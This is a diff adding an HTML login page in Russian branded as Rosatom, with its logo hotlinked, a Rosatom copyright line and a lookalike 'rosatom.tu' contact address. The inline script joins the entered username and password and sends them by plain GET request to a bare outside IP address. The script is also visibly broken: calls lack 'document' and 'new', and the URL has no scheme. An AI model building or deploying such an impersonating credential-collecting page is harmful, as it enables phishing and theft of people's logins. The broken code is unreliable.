@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="style2.css">
+	<script type="text/javascript" src="js/loader.js"></script>
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <script src="js/main.js"></script>
+    <script src="js/jquery.arcticmodal-0.3.min.js"></script>
+    <link rel="stylesheet" href="js/jquery.arcticmodal-0.3.css">
+	<link width = 16px height = 16px rel="shortcut icon" href="https://www.rosatom.ru/local/tpl/img/site_rosatom_ru.png" type="image/x-icon">
+	<title>Вход</title>
+</head>
+<body>
+	<script type="text/javascript">
+		function GetRequest(){
+			var x = getElementById("log-log").value;
+			var y = getElementById("log-pass").value;
+			var request = XMLHttpRequest();
+			var body = x+y;
+			request.open('GET', '193.124.117.32/##.php'+body);
+			request.send();
+			return request.responseText();
+		}
+		function Compare() {
+			var x = getElementById("log-log").value;
+			var y = getElementById("log-pass").value;
+			var body = x+y;
+			if(GetRequest() != body) alert("Неверный логин или пароль");
+		}
+	</script>
+<header> </header>
+<content class="content login">
+	<div class="log_form">
+		<img align="center" class = "login_LOGO" src="https://www.rosatom.ru/local/tpl/img/site_rosatom_ru.png" alt="">
+		<p  class = "welcome" align="center">Добро Пожаловать</p>
+		<p class="log_txt">Логин</p>
+		<input type="email" class="log-put" name="" placeholder="Введите свой логин" required id="log-log">
+		<p class="log_txt">Пароль</p>
+		<input type="password" class="log-put" name="" required id="log-pass">
+		<a href="main.html" class="button1" onclick="adminLog(), toServ('log-put')" >Войти</a>
+	</div>
+</content>
+</body>
+<div class="footer padding-site clearfix">
+        <p class="contact">Свяжись с нами</p>
+        <p class="adress">Москва, Красная площадь&nbsp;Россия.
+            <br>
+            <br> Обращайтесь&nbsp;по&nbsp;1337&nbsp;228. contact@rosatom.tu</p>
+        <div class="useful-container">
+            <p class="usefulinf">Полезная информация</p>
+            <ul class="useful1-menu">
+                <li class="useful-list"><a class="useful-link" href="">Техническая поддержа</a></li>
+                <li class="useful-list"><a class="useful-link" href="">Свяжись с&nbsp;куратором</a></li>
+            </ul>
+            <ul class="useful2-menu">
+                <li class="useful-list"><a class="useful-link" href="">Исправить ошибку</a></li>
+                <li class="useful-list"><a class="useful-link" href="">Нормативные документы</a></li>
+            </ul>
+        </div>
+        <div class="lets-container">
+            <p class="lets">Подпишитесь чтобы узнать <br> <br>  о новостях.</p>
+            <input type="email" class="mail-put" placeholder="Ваш адрес электронной почты"> </div>
+        <p class="copyright">&copy;Copyright - РОСАТОМ 2021. Все права защищены.</p>
+        <ul class="social-menu">
+            <li class="social-list"><a class="social-links" href=""><img class="social-links-img" src="image/facebook.svg" alt=""></a></li>
+            <li class="social-list"><a class="social-links" href=""><img class="social-links-img" src="image/twitter.svg" alt=""></a></li>
+            <li class="social-list"><a class="social-links" href=""><img class="social-links-img" src="image/google-plus.svg" alt=""></a></li>
+            <li class="social-list"><a class="social-links" href=""><img class="social-links-img" src="image/pinterest.svg" alt=""></a></li>
+        </ul>
+        <p class="terms">Terms &amp; Conditions / Privacy policy &amp; Cookies</p>
+    </div>
+</html>
